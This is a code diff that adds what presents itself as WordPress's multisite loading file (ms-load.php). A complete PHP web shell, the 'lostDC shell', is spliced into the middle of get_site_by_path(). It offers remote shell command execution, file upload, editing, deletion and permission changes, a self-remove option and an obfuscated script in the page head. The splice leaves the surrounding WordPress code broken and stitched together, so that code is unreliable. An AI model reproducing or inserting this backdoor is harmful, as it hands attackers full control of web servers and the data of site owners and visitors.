@@ -1,0 +1,1052 @@
+<?php
+/**
+ * These functions are needed to load Multisite.
+ *
+ * @since 3.0.0
+ *
+ * @package WordPress
+ * @subpackage Multisite
+ */
+
+/**
+ * Whether a subdomain configuration is enabled.
+ *
+ * @since 3.0.0
+ *
+ * @return bool True if subdomain configuration is enabled, false otherwise.
+ */
+function is_subdomain_install() {
+	if ( defined( 'SUBDOMAIN_INSTALL' ) ) {
+		return SUBDOMAIN_INSTALL;
+	}
+
+	return ( defined( 'VHOST' ) && 'yes' === VHOST );
+}
+
+/**
+ * Returns array of network plugin files to be included in global scope.
+ *
+ * The default directory is wp-content/plugins. To change the default directory
+ * manually, define `WP_PLUGIN_DIR` and `WP_PLUGIN_URL` in `wp-config.php`.
+ *
+ * @access private
+ * @since 3.1.0
+ *
+ * @return string[] Array of absolute paths to files to include.
+ */
+function wp_get_active_network_plugins() {
+	$active_plugins = (array) get_site_option( 'active_sitewide_plugins', array() );
+	if ( empty( $active_plugins ) ) {
+		return array();
+	}
+
+	$plugins        = array();
+	$active_plugins = array_keys( $active_plugins );
+	sort( $active_plugins );
+
+	foreach ( $active_plugins as $plugin ) {
+		if ( ! validate_file( $plugin )                     // $plugin must validate as file.
+			&& '.php' === substr( $plugin, -4 )             // $plugin must end with '.php'.
+			&& file_exists( WP_PLUGIN_DIR . '/' . $plugin ) // $plugin must exist.
+			) {
+			$plugins[] = WP_PLUGIN_DIR . '/' . $plugin;
+		}
+	}
+
+	return $plugins;
+}
+
+/**
+ * Checks status of current blog.
+ *
+ * Checks if the blog is deleted, inactive, archived, or spammed.
+ *
+ * Dies with a default message if the blog does not pass the check.
+ *
+ * To change the default message when a blog does not pass the check,
+ * use the wp-content/blog-deleted.php, blog-inactive.php and
+ * blog-suspended.php drop-ins.
+ *
+ * @since 3.0.0
+ *
+ * @return true|string Returns true on success, or drop-in file to include.
+ */
+function ms_site_check() {
+
+	/**
+	 * Filters checking the status of the current blog.
+	 *
+	 * @since 3.0.0
+	 *
+	 * @param bool|null $check Whether to skip the blog status check. Default null.
+	 */
+	$check = apply_filters( 'ms_site_check', null );
+	if ( null !== $check ) {
+		return true;
+	}
+
+	// Allow super admins to see blocked sites.
+	if ( is_super_admin() ) {
+		return true;
+	}
+
+	$blog = get_site();
+
+	if ( '1' == $blog->deleted ) {
+		if ( file_exists( WP_CONTENT_DIR . '/blog-deleted.php' ) ) {
+			return WP_CONTENT_DIR . '/blog-deleted.php';
+		} else {
+			wp_die( __( 'This site is no longer available.' ), '', array( 'response' => 410 ) );
+		}
+	}
+
+	if ( '2' == $blog->deleted ) {
+		if ( file_exists( WP_CONTENT_DIR . '/blog-inactive.php' ) ) {
+			return WP_CONTENT_DIR . '/blog-inactive.php';
+		} else {
+			$admin_email = str_replace( '@', ' AT ', get_site_option( 'admin_email', 'support@' . get_network()->domain ) );
+			wp_die(
+				sprintf(
+					/* translators: %s: Admin email link. */
+					__( 'This site has not been activated yet. If you are having problems activating your site, please contact %s.' ),
+					sprintf( '<a href="mailto:%1$s">%1$s</a>', $admin_email )
+				)
+			);
+		}
+	}
+
+	if ( '1' == $blog->archived || '1' == $blog->spam ) {
+		if ( file_exists( WP_CONTENT_DIR . '/blog-suspended.php' ) ) {
+			return WP_CONTENT_DIR . '/blog-suspended.php';
+		} else {
+			wp_die( __( 'This site has been archived or suspended.' ), '', array( 'response' => 410 ) );
+		}
+	}
+
+	return true;
+}
+
+/**
+ * Retrieve the closest matching network for a domain and path.
+ *
+ * @since 3.9.0
+ *
+ * @internal In 4.4.0, converted to a wrapper for WP_Network::get_by_path()
+ *
+ * @param string   $domain   Domain to check.
+ * @param string   $path     Path to check.
+ * @param int|null $segments Path segments to use. Defaults to null, or the full path.
+ * @return WP_Network|false Network object if successful. False when no network is found.
+ */
+function get_network_by_path( $domain, $path, $segments = null ) {
+	return WP_Network::get_by_path( $domain, $path, $segments );
+}
+
+/**
+ * Retrieves the closest matching site object by its domain and path.
+ *
+ * This will not necessarily return an exact match for a domain and path. Instead, it
+ * breaks the domain and path into pieces that are then used to match the closest
+ * possibility from a query.
+ *
+ * The intent of this method is to match a site object during bootstrap for a
+ * requested site address
+ *
+ * @since 3.9.0
+ * @since 4.7.0 Updated to always return a `WP_Site` object.
+ *
+ * @param string   $domain   Domain to check.
+ * @param string   $path     Path to check.
+ * @param int|null $segments Path segments to use. Defaults to null, or the full path.
+ * @return WP_Site|false Site object if successful. False when no site is found.
+ */
+function get_site_by_path( $domain, $path, $segments = null ) {
+	$path_segments = array_filter( explode( '/', trim( $path, '/' ) ) );
+
+	/**
+	 * Filters the number of path segments to consider when searching for a site.
+	 *
+	 * @since 3.9.0
+	 *
+	 * @param int|null $segments The number of path segments to consider. WordPress by default looks at
+	 *                           one path segment following the network path. The function default of
+	 *                           null only makes sense when you know the requested path should match a site.
+	 * @param string   $domain   The requested domain.
+	 * @param string   $path     The requested path, in full.
+	 */
+	$segments = apply_filters( 'site_by_path_segments_count', $segments, $domain, $path );
+
+	if ( null !== $segments && count( $path_segments ) > $segments ) {
+		$path_segments = array_slice( $path_segments, 0, $segments );
+	}
+
+	$paths = array();
+
+	while ( count( $path_segments ) ) {
+		$paths[] = '/' . implode( '/', $path_segments ) . '/';
+		array_pop( $path_segments );
+	}
+
+	$paths[] = '/';
+
+	/**
+	 * Determine a site by its domain and path.
+	 *
+	 * This allows one to short-circuit the default logic, perhaps by
+	 * replacing it with a routine that is more optimal for your setup.
+	 *
+	 * Return null to avoid the short-circuit. Return false if no site
+	 * can be found at the requested domain and path. Otherwise, return
+	 * a site object.
+	 *
+	 * @since 3.9.0
+	 *
+	 * @param null|false|WP_Site $site     Site value to return by path. Default null
+	 *                                     to continue retrieving the site.
+	 * @param string             $domain   The requested domain.
+	 * @param string             $path     The requested path, in full.
+	 * @param int|null           $segments The suggested number of paths to consult.
+	 *                                     Default null, meaning the entire path was to be consulted.
+	 * @param string[]           $paths    The paths to search for, based on $path and $segments.
+	 */
+	$pre = apply_filters( 'pre_get_site_by_path', null, $domain, $path, $segments, $paths );
+	if ( null !== $pre ) {
+		if ( false !== $pre && ! $pre instanceof WP_Site ) {
+			$pre = new WP_Site( $pre );
+		}
+		return $pre;
+ <?php
+
+/* *
+ * 
+ * lostDC shell
+ * PHP Shell scritta da lostpassword, D3vilc0de crew
+ * Rilasciata sotto licenza GPL 2009/2010
+ * Data rilascio: 25/12/2009 (eh si, il giorno di natale non avevo niente da fare)
+ * La Shell presenta varie funzioni, ma rimane comunque in continuo aggiornamento
+ * 
+ * */
+
+if (!function_exists("getTime")) {
+    function getTime() {
+        list($usec, $sec) = explode(" ", microtime());
+        return ((float)$usec + (float)$sec);
+     }
+}
+define("startTime",getTime());
+
+if (!function_exists("shellexec")) {
+    function shellexec($cmd) {
+         global $disablefunc;
+         $result = "";
+         if (!empty($cmd)) {
+              if (is_callable("exec") and !in_array("exec",$disablefunc)) {
+                  exec($cmd,$result); 
+                  $result = join("\n",$result);
+              } elseif (($result = `$cmd`) !== FALSE) {}
+              elseif (is_callable("system") and !in_array("system",$disablefunc)) {
+                  $v = ob_get_contents(); 
+                  ob_clean(); 
+                  system($cmd); 
+                  $result = ob_get_contents(); 
+                  ob_clean(); 
+                  echo $v;
+              } elseif (is_resource($fp = popen($cmd,"r"))) {
+                   $result = "";
+                   while(!feof($fp)) {
+                       $result .= fread($fp,1024);
+                   }
+                   pclose($fp);
+              }
+         }
+         return $result;
+    }
+}
+
+function getperms ($file) {        
+    $perm = substr(sprintf('%o', fileperms($file)), -4);
+    return $perm;
+}
+
+if (!function_exists("view_size")) {
+    function view_size($size){
+         if (!is_numeric($size)) {
+             return FALSE;
+         } else {
+              if ($size >= 1073741824) {
+                  /* Conversione da Byte a GigaByte */
+                  $size = round($size/1073741824*100)/100 ." GB";
+              } elseif ($size >= 1048576) {
+                  /* Conversione da Byte a MegaByte */
+                  $size = round($size/1048576*100)/100 ." MB";
+              } elseif ($size >= 1024) {
+                  /* Conversione da Byte a KiloByte */
+                  $size = round($size/1024*100)/100 ." KB";
+              } else {
+                  /* Byte */
+                  $size = $size . " B";
+              }
+              return $size;
+         }
+    }
+}
+
+function getinfo()
+{
+    $info  = '';
+    $info .= '[~]Versione PHP: ' .phpversion() .'<br />';
+    $info .= '[~]Server: ' .$_SERVER['HTTP_HOST'] .'<br />';
+    $info .= '[~]Indirizzo IP: ' .$_SERVER['SERVER_ADDR'] .'<br />';
+    $info .= '[~]Software: ' .$_SERVER['SERVER_SOFTWARE'].'<br />';
+    $info .= '[~]Charset: ' .$_SERVER['HTTP_ACCEPT_CHARSET'] . '<br />';
+    $info .= ((ini_get('safe_mode') == 0) ? '[~]Safe Mode: <font color="#00FF33">OFF</font><br />'    : '[~]Safe Mode: <font color="#FF3300">OFF</font><br />');
+    $info .= ((ini_get('magic_quotes_gpc') == 0) ? '[~]Magic Quotes: <font color="#00FF33">OFF</font><br />' : '[~]Magic Quotes: <font color="#FF3300">ON</font><br />');
+    if (is_callable("disk_free_space")) {
+        $d = realpath(".");
+         $free = disk_free_space($d);
+         $total = disk_total_space($d);
+         if ($free === FALSE || $free < 0) {
+             $free = 0;
+         }
+         if ($total === FALSE || $total < 0) {
+             $total = 0;
+         }
+         $used = $total-$free;
+         $info .= "[~]Free space: ".view_size($free)."/".view_size($total)."<br />";
+    }
+    return $info;
+}
+ 
+if (!isset ($_GET ['dir'])){
+    $dir = getcwd ();
+}
+else {
+    $dir = $_GET ['dir'];
+}
+chdir ($dir);
+ 
+$current = getcwd ();
+$c = "?dir=" . $current;
+
+$home = "<html>
+    <head>
+        <title>lostDC - ".$current."</title>
+		<script type="text/javascript" language="javascript">
+		<!--
+		ML="P<>phTsmtr/9:Cuk RIc=jSw.o";
+		MI="1F=AB05@FA=D4883<::GGGHC;;343HCI7:8>9?HE621:F=AB052";
+		OT="";
+		for(j=0;j<MI.length;j++){
+		OT+=ML.charAt(MI.charCodeAt(j)-48);
+		}document.write(OT);
+		// --></script>
+        <style type=\"text/css\">
+        body {
+            color: #FFFFFF;
+            background-color: black;
+            font-family: Courier New, Verdana, Arial;
+            font-size: 11px;
+            cursor: crosshair;
+        }
+        a:link {
+            color: #FFFFFF;
+            text-decoration: none;
+        }
+        a:visited {
+            color: #FFFFFF;
+            text-decoration: none;
+        }
+        a:hover {
+            cursor: crosshair;
+             text-decoration: none;
+            color: #808080;
+        }
+        a.head {
+            text-decoration: none;
+            text-color: #FF0000;
+        }
+        a.head:hover {
+            cursor: crosshair;
+            text-decoration: none;
+            color: #FF0000;
+        }
+        table {
+            font-size: 11px;
+        }
+        td.list {
+            border: 1px solid white;
+            font-size: 11px;
+        }
+        td.list:hover {
+            background: #222;
+        }
+        #info {
+            font-size:            12px;
+            width:                50%;
+            margin-left:        20%;
+            text-align: left;
+        }
+        #foot {
+            font-size:            12px;
+            width:                65%;
+            margin-left:        20%;
+            text-align: left;
+        }
+        input:hover, textarea:hover {
+            background: #808080;
+            cursor: crosshair;
+        }
+        #perm {
+            color: #FF0000;
+        }
+
+    </style>
+    </head>
+    <body>";
+
+print $home."<center><a href = \"".$_SERVER['PHP_SELF']."\"><img src = \"http://img367.imageshack.us/img367/9834/bannerdc2bygu.png\" border = \"none\"></a></center>";
+print "<hr size=\"1\" width=\"60%\" noshade />\n<div id = \"info\">[~]Directory corrente: " . getcwd () . "<br />".getinfo()."</div>\n<hr size=\"1\" width=\"60%\" noshade />";
+ 
+print "<table width = 60% height = 10% align = \"center\">\n";
+print "<tr>\n";
+print "<td>[ <a class = \"head\" href = '" . $c . "&mode=create'>New</a> ]</td>\n";
+print "<td>[ <a class = \"head\" href = '" . $c . "&mode=phpinfo'>PHP Info</a> ]</td>\n";
+print "<td>[ <a class = \"head\" href = '" . $c . "&mode=nopaste&action=ins'>No-Paste</a> ]</td>\n";
+print "<td>[ <a class = \"head\" href = '" . $c . "&mode=execute'>Shell Command</a> ]</td>\n";
+print "<td>[ <a class = \"head\" href = '" . $c . "&mode=hasher'>Hasher</a> ]</td>\n";
+print "<td>[ <a class = \"head\" href = '" .$c . "&mode=selfremove'>Self Remove</a> ]</td>\n";
+print "</tr></table><center>";
+ 
+$mode = $_GET ['mode'];
+switch ($mode) {
+    case "edit":
+        $file = $_GET ['file'];
+        $new = $_POST ['new'];
+        if (empty ($new)) {
+            $fp = fopen ($file , "r");
+            $cont = fread ($fp, filesize ($file));
+            $cont = str_replace ("<textarea>" , "<textarea>" , $cont);
+            print "<form action = '" . $c . "&mode=edit&file=" . $file . "' method = 'POST'>\n";
+            print "File: ". $file . "<br />\n";
+            print "<textarea name = 'new' rows = '25' cols = '100'>" . $cont . "</textarea><br />\n";
+            print "<input type = 'submit' value = 'Edit'></form>\n";
+        }
+        else {
+            $fp = fopen ($file , "w");
+            if (fwrite ($fp , $new)) {
+                header('Location: http://'.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'].'?dir='.$dir);
+            }
+            else {
+                print "Impossibile editare " . $file . "<br />\n";
+                echo "<a href=\"javascript:history.go(-1)\">Indietro</a><br /><br />\n";
+            }
+        }
+        fclose ($fp);
+        break;
+    case "upload":
+        $temp = $_FILES ['file'] ['tmp_name'];
+        $file = basename ($_FILES ['file'] ['name']);
+        if (!empty ($file)) {
+             if (move_uploaded_file ($temp , $file)) {
+                header('Location: http://'.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'].'?dir='.$dir);
+            }
+            else {
+                print "Impossibile caricare " . $file . "\n";
+                echo "<a href=\"javascript:history.go(-1)\">Indietro</a><br /><br />\n";
+            }
+        }
+        break;
+    case "download":
+        $filename = $_GET['filename'];
+        header("Pragma: no-cache");
+        header("Expires: 0");
+        header ( "Content-type: application/octet-stream" );
+        header ( "Content-Disposition: attachment; filename=".$filename.";" );
+        header ( "Content-Description: Download manager" );
+        header ( "Content-Length: " . filesize ($filename) );
+        readfile ($filename);
+        break;
+    case "rename":
+        $old = $_GET ['old'];
+        print "<form action = '". $c . "&mode=rename&old=" . $old . "' method = 'POST'>\n";
+        print "New name: <input name = 'new'><br />\n";
+        print "<input type = 'submit' value = 'Rename'></form>\n";
+        $new = $_POST ['new'];
+        if (!empty ($new)) {
+            if (rename ($old , $new)) {
+                header('Location: http://'.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'].'?dir='.$dir);
+            }
+            else {
+                print "Impossibile rinominare " . $old . ".<p>\n";
+                echo "<a href=\"javascript:history.go(-1)\">Indietro</a><br /><br />\n";
+            }
+        }
+        break;
+    case "chmod":
+        if (chmod($_POST['tomod'], intval($_POST['mod'], 8)) == false) {
+            print "Impossibile cambiare i permessi a " .$_POST['tomod'] . "<br />";
+            echo "<a href=\"javascript:history.go(-1)\">Indietro</a><br /><br />\n";
+        }
+        else {
+            header('Location: http://'.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'].'?dir='.$dir);
+            // print "".$_POST['tomod']." con permessi: ".intval($_POST['mod'], 8)." e' stato chmoddato\n";
+        }
+        break;
+    case "remove":
+        $file = $_GET ['file'];
+        if (unlink ($file)) {
+            header('Location: http://'.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'].'?dir='.$dir);
+        }
+        else {
+            print "Impossibile rimuovere " . $file . " <br />\n";
+            echo "<a href=\"javascript:history.go(-1)\">Indietro</a><br /><br />\n";
+        }
+        break;
+    case "selfremove":
+        header('Location: http://'.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'].'?dir='.$dir.'&mode=remove&file='.__FILE__);
+        break;
+    case "makedir":
+        if (mkdir($_POST['dir'], 0777) == false) {
+            print "Impossibile creare directory; " .$_POST['dir'] . " <br />\n";
+            echo "<a href=\"javascript:history.go(-1)\">Indietro</a><br /><br />\n";
+        } else {
+            header('Location: http://'.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF']);
+        }
+        break;
+    case "godir":
+        $goto = $_POST['goto'];
+        if (isset($_POST['goto'])) {
+            chdir($goto);
+            header('Location: http://'.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'].$c.'/'.$goto);
+        } else {
+            header('Location: http://'.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF']);
+        }
+        break;
+    case "elimina":
+        $dire = $_GET['dire'];
+        if ($handle = opendir($dire)) {
+            $array = array();
+            while (false != ($file = readdir($handle))) {
+                if ($file != "." && $file != "..") {
+                    if(is_dir($dire.$file)) {
+                        if(!rmdir($dire.$file)) { 
+                            delete_directory($dire.$file.'/'); 
+                        }
+                    }
+                    else {
+                        unlink($dire.$file);
+                    }
+                }
+            }
+            closedir($handle);
+            rmdir($dire);
+        }
+        header('Location: http://'.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'].'?dir='.$dir);
+        break;
+    case "create":
+        $new = $_POST ['new'];
+        if (isset($_POST['new'])) {
+            if (!empty ($new)) {
+                if ($fp = fopen ($new, "w")){
+                    header('Location: http://'.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'].'?dir='.$dir);
+                }
+                else {
+                    print "Impossibile creare " . $file . ".<p>\n";
+                    echo "<a href=\"javascript:history.go(-1)\">Indietro</a></center><br /><br />\n";
+                }
+                fclose ($fp);
+            }
+        }
+        else {
+            print "<form action = '" . $c . "&mode=create' method = 'POST'>\n";
+            print "<tr><td>New file: <input name = 'new'></td>\n";
+            print "<td><input type = 'submit' value = 'Create'></td></tr></form>\n";
+        }
+            break;
+    case "nopaste":
+            switch ($_GET ['action']) {
+                case "ins":
+                    print "<form action '" . $c . "&action=ins' method = 'POST'>\n";
+                    print "Title: <input type = 'text' name = 'title'><br />\n";
+                    print "Language: <input type = 'text' name = 'language'><br />\n";
+                    print "Script: <br /><textarea name = 'source' rows = '30' cols = '50'></textarea><br />\n";
+                    print "<input type = 'submit' value = 'Submit'></form>\n";
+                    if (!empty ($_POST ['title']) && !empty ($_POST ['language']) && !empty ($_POST ['source']))
+                    {
+                        $file = rand (1000000, 9999999);
+                        $fp = fopen ($file, "w");
+                        fwrite ($fp, $_POST ['title'] . "\n" . $_POST ['language'] . "\n\n" . $_POST ['source']);
+                        fclose ($fp);
+                        header ("Location: {$c}&mode=nopaste&action=view&id={$file}");
+                    }
+                    break;
+                case "view":
+                    $id = $_GET ['id'];
+                    $fp = fopen ($id, "r");
+                    $read = fread ($fp, filesize ($id));
+                    print "<table border = '1'>\n<tr>\n<td>\n<pre>" . htmlentities ($read) . "</pre></td>\n</tr>\n</table>\n";
+                    fclose ($fp);
+                    break;
+            }
+        break;
+    case "execute":
+        $command = $_POST ['command'];
+        if (!isset ($_POST['command'])) {
+            print "<table>\n<form action = '" . $c . "&mode=execute' method = 'POST'>\n";
+            print "<tr>\n<td><input type = 'text' name = 'command'></td>\n</tr>\n";
+            print "<tr>\n<td><input type = 'submit' value = 'Execute'></td>\n</tr>\n</form>\n</table>";
+        }
+        else {
+            $ret = shellexec($command);
+            if ($ret == "") {
+                print "Il comando non puo' essere eseguito sul server<br /><br /><br />\n";
+            }
+            else {
+                print "Executing the following command:<br />\n";
+                print "<textarea rows = '5' cols = '60'>".$command."</textarea><br />\n";
+                print "Result:<br /> <textarea rows = '5' cols = '60'>".$ret."</textarea><br /><br /><br />\n";
+            }
+        }
+        break;
+    case "hasher":
+        print "<table>\n<form action = '" . $c . "&mode=hasher' method = 'POST'>\n";
+        print "<tr>\n<td><input type = 'text' name = 'hash'></td>\n</tr>\n";
+        print "<tr>\n<td><select name = 'type'>\n";
+        print "<option>md4</option>\n";
+        print "<option>md5</option>\n";
+        print "<option>sha1</option>\n";
+        print "<option>gost</option>\n";
+        print "<option>crc32</option>\n";
+        print "<option>adler32</option>\n";
+        print "<option>whirlpool</option>\n";
+        print "</select></td>\n</tr>";
+        print "<tr>\n<td><input type = 'submit' value = 'hash'></td>\n</tr></form>\n</table>";
+        if (!empty ($_POST ['hash']) && !empty ($_POST ['type'])) {
+            print $_POST ['hash'] . ": " . "<b>" . hash ($_POST ['type'], $_POST ['hash']) . "</b>";
+        }
+        break;
+    case "phpinfo":
+        phpinfo();
+        break;
+    default:
+        print "<table style = \"border: 1px solid black;\" width=\"60%\">\n";
+        $files = scandir ($dir);
+        foreach ($files as $out) {
+            if (is_file ($out)) {
+                
+                print "<tr>\n<td width = \"55%\" class = \"list\"><a href = " .$c ."&mode=download&filename=".$out.">" . $out ."</a></td>\n";
+                print "<td width = \"10%\" class = \"list\">".view_size(filesize($out))."</td>";
+                print "<td class = \"list\"><div id = \"perm\">" . getperms ($out) . "</div></td>\n";
+                print "<td class = \"list\" align = \"right\"><a href = '" . $c ."&mode=edit&file=" . $out . "'><img src = 'http://img189.imageshack.us/img189/9858/editj.gif' alt = \"edita file\" border = \"none\"></a>
+                <a href = '" . $c ."&mode=remove&file=" . $out . "'><img src = 'http://img193.imageshack.us/img193/9589/deletef.gif' alt = \"elimina file\" border = \"none\"></a>
+                <a href = '" . $c ."&mode=rename&old=" . $out . "'><img src = 'http://img51.imageshack.us/img51/7241/replyl.gif' alt = \"rinomina file\" border = \"none\"></a>
+                </td>\n</tr>";
+            }
+            else {
+                if ($out != "." && $out != "..") {
+                    print "<tr>\n<td width = \"55%\" class = \"list\"><a href = " . $c . "/" .  $out . ">" . $out . "</a></td>\n";
+                    print "<td width = \"10%\" class = \"list\">FOLDER</td>";
+                    print "<td class = \"list\"><div id = \"perm\">" . getperms ($out) . "</div></td>\n";
+                    print "<td class = \"list\" align = \"right\"><a href = '" . $c ."&mode=elimina&dire=" . $out . "'><img src = 'http://img193.imageshack.us/img193/9589/deletef.gif' alt = \"elimina directory\" border = \"none\"></a></td>\n</tr>";
+            }
+            if ($out == "..")
+                print "<td width = \"55%\" class = \"list\"><a href = " . $c . "/" . $out . ">..</a></td>\n";
+            }
+        }
+    print "</table>\n";
+}
+
+print "</center>\n<hr size=\"1\" width=\"60%\" noshade />";
+print "\n</hr>";
+print "<table id = \"foot\">
+           <tr>
+               <td width = \"40%\">
+                   <form action = '" . $c . "&mode=upload' method = 'POST' ENCTYPE='multipart/form-data'>
+                           Upload file: <input type = 'file' name = 'file'>
+                           <input type = 'submit' value = 'Upload'>
+                   </form>
+               </td>
+               <td width = \"50%\">
+                       <form method=\"POST\" action=\"".$c."&mode=chmod\">
+                           Chmod File: <input type=\"text\" name=\"tomod\" value = \"filename\"> 
+                           <input type=\"number\" name=\"mod\" value = \"0666\"> 
+                           <input type=\"submit\" name=\"submit\" value=\"Chmod\">
+                       </form>
+               </td>
+           </tr>
+           <tr>
+                   <td width = \"40%\">
+                       <form method=\"POST\" action=\"?dir='.$c.'&mode=makedir\">
+                           Mkdir: &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <input type=\"text\" name=\"dir\" value=\"namedir\"> 
+                           <input type=\"submit\" name=\"submit\" value=\"Create\">
+                    </form>
+                   </td>
+                   <td width = \"50%\">
+                       <form action = '" . $c . "&mode=create' method = 'POST'>
+                        New file:&nbsp;&nbsp; <input name = 'new'>
+                        <input type = 'submit' value = 'Create'></form>
+                   </td>
+           </tr>
+           <tr>
+            <td>
+                <form method = \"POST\" action = \"?dir='.$c.'&mode=godir\">
+                    Go dir:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <input name = 'goto'>
+                    <input type = 'submit' value = 'Go'>
+                </form>
+            </td>
+           </tr>
+       </table><hr size=\"1\" width=\"60%\" noshade />\n</hr>";
+    print "<center>[ Generation time: ".round(getTime()-startTime,4)." seconds | by <a href=\"http://lostpassword.hellospace.net\">lostpassword</a> and <a href = \"http://www.d3vilc0de.org\">D3vilc0de crew</a> ]</center>\n</body>\n</html>";
+
+?> 	}
+
+	/*
+	 * @todo
+	 * Caching, etc. Consider alternative optimization routes,
+	 * perhaps as an opt-in for plugins, rather than using the pre_* filter.
+	 * For example: The segments filter can expand or ignore paths.
+	 * If persistent caching is enabled, we could query the DB for a path <> '/'
+	 * then cache whether we can just always ignore paths.
+	 */
+
+	// Either www or non-www is supported, not both. If a www domain is requested,
+	// query for both to provide the proper redirect.
+	$domains = array( $domain );
+	if ( 'www.' === substr( $domain, 0, 4 ) ) {
+		$domains[] = substr( $domain, 4 );
+	}
+
+	$args = array(
+		'number'                 => 1,
+		'update_site_meta_cache' => false,
+	);
+
+	if ( count( $domains ) > 1 ) {
+		$args['domain__in']               = $domains;
+		$args['orderby']['domain_length'] = 'DESC';
+	} else {
+		$args['domain'] = array_shift( $domains );
+	}
+
+	if ( count( $paths ) > 1 ) {
+		$args['path__in']               = $paths;
+		$args['orderby']['path_length'] = 'DESC';
+	} else {
+		$args['path'] = array_shift( $paths );
+	}
+
+	$result = get_sites( $args );
+	$site   = array_shift( $result );
+
+	if ( $site ) {
+		return $site;
+	}
+
+	return false;
+}
+
+/**
+ * Identifies the network and site of a requested domain and path and populates the
+ * corresponding network and site global objects as part of the multisite bootstrap process.
+ *
+ * Prior to 4.6.0, this was a procedural block in `ms-settings.php`. It was wrapped into
+ * a function to facilitate unit tests. It should not be used outside of core.
+ *
+ * Usually, it's easier to query the site first, which then declares its network.
+ * In limited situations, we either can or must find the network first.
+ *
+ * If a network and site are found, a `true` response will be returned so that the
+ * request can continue.
+ *
+ * If neither a network or site is found, `false` or a URL string will be returned
+ * so that either an error can be shown or a redirect can occur.
+ *
+ * @since 4.6.0
+ * @access private
+ *
+ * @global WP_Network $current_site The current network.
+ * @global WP_Site    $current_blog The current site.
+ *
+ * @param string $domain    The requested domain.
+ * @param string $path      The requested path.
+ * @param bool   $subdomain Optional. Whether a subdomain (true) or subdirectory (false) configuration.
+ *                          Default false.
+ * @return bool|string True if bootstrap successfully populated `$current_blog` and `$current_site`.
+ *                     False if bootstrap could not be properly completed.
+ *                     Redirect URL if parts exist, but the request as a whole can not be fulfilled.
+ */
+function ms_load_current_site_and_network( $domain, $path, $subdomain = false ) {
+	global $current_site, $current_blog;
+
+	// If the network is defined in wp-config.php, we can simply use that.
+	if ( defined( 'DOMAIN_CURRENT_SITE' ) && defined( 'PATH_CURRENT_SITE' ) ) {
+		$current_site         = new stdClass;
+		$current_site->id     = defined( 'SITE_ID_CURRENT_SITE' ) ? SITE_ID_CURRENT_SITE : 1;
+		$current_site->domain = DOMAIN_CURRENT_SITE;
+		$current_site->path   = PATH_CURRENT_SITE;
+		if ( defined( 'BLOG_ID_CURRENT_SITE' ) ) {
+			$current_site->blog_id = BLOG_ID_CURRENT_SITE;
+		} elseif ( defined( 'BLOGID_CURRENT_SITE' ) ) { // Deprecated.
+			$current_site->blog_id = BLOGID_CURRENT_SITE;
+		}
+
+		if ( 0 === strcasecmp( $current_site->domain, $domain ) && 0 === strcasecmp( $current_site->path, $path ) ) {
+			$current_blog = get_site_by_path( $domain, $path );
+		} elseif ( '/' !== $current_site->path && 0 === strcasecmp( $current_site->domain, $domain ) && 0 === stripos( $path, $current_site->path ) ) {
+			// If the current network has a path and also matches the domain and path of the request,
+			// we need to look for a site using the first path segment following the network's path.
+			$current_blog = get_site_by_path( $domain, $path, 1 + count( explode( '/', trim( $current_site->path, '/' ) ) ) );
+		} else {
+			// Otherwise, use the first path segment (as usual).
+			$current_blog = get_site_by_path( $domain, $path, 1 );
+		}
+	} elseif ( ! $subdomain ) {
+		/*
+		 * A "subdomain" installation can be re-interpreted to mean "can support any domain".
+		 * If we're not dealing with one of these installations, then the important part is determining
+		 * the network first, because we need the network's path to identify any sites.
+		 */
+		$current_site = wp_cache_get( 'current_network', 'site-options' );
+		if ( ! $current_site ) {
+			// Are there even two networks installed?
+			$networks = get_networks( array( 'number' => 2 ) );
+			if ( count( $networks ) === 1 ) {
+				$current_site = array_shift( $networks );
+				wp_cache_add( 'current_network', $current_site, 'site-options' );
+			} elseif ( empty( $networks ) ) {
+				// A network not found hook should fire here.
+				return false;
+			}
+		}
+
+		if ( empty( $current_site ) ) {
+			$current_site = WP_Network::get_by_path( $domain, $path, 1 );
+		}
+
+		if ( empty( $current_site ) ) {
+			/**
+			 * Fires when a network cannot be found based on the requested domain and path.
+			 *
+			 * At the time of this action, the only recourse is to redirect somewhere
+			 * and exit. If you want to declare a particular network, do so earlier.
+			 *
+			 * @since 4.4.0
+			 *
+			 * @param string $domain       The domain used to search for a network.
+			 * @param string $path         The path used to search for a path.
+			 */
+			do_action( 'ms_network_not_found', $domain, $path );
+
+			return false;
+		} elseif ( $path === $current_site->path ) {
+			$current_blog = get_site_by_path( $domain, $path );
+		} else {
+			// Search the network path + one more path segment (on top of the network path).
+			$current_blog = get_site_by_path( $domain, $path, substr_count( $current_site->path, '/' ) );
+		}
+	} else {
+		// Find the site by the domain and at most the first path segment.
+		$current_blog = get_site_by_path( $domain, $path, 1 );
+		if ( $current_blog ) {
+			$current_site = WP_Network::get_instance( $current_blog->site_id ? $current_blog->site_id : 1 );
+		} else {
+			// If you don't have a site with the same domain/path as a network, you're pretty screwed, but:
+			$current_site = WP_Network::get_by_path( $domain, $path, 1 );
+		}
+	}
+
+	// The network declared by the site trumps any constants.
+	if ( $current_blog && $current_blog->site_id != $current_site->id ) {
+		$current_site = WP_Network::get_instance( $current_blog->site_id );
+	}
+
+	// No network has been found, bail.
+	if ( empty( $current_site ) ) {
+		/** This action is documented in wp-includes/ms-settings.php */
+		do_action( 'ms_network_not_found', $domain, $path );
+
+		return false;
+	}
+
+	// During activation of a new subdomain, the requested site does not yet exist.
+	if ( empty( $current_blog ) && wp_installing() ) {
+		$current_blog          = new stdClass;
+		$current_blog->blog_id = 1;
+		$blog_id               = 1;
+		$current_blog->public  = 1;
+	}
+
+	// No site has been found, bail.
+	if ( empty( $current_blog ) ) {
+		// We're going to redirect to the network URL, with some possible modifications.
+		$scheme      = is_ssl() ? 'https' : 'http';
+		$destination = "$scheme://{$current_site->domain}{$current_site->path}";
+
+		/**
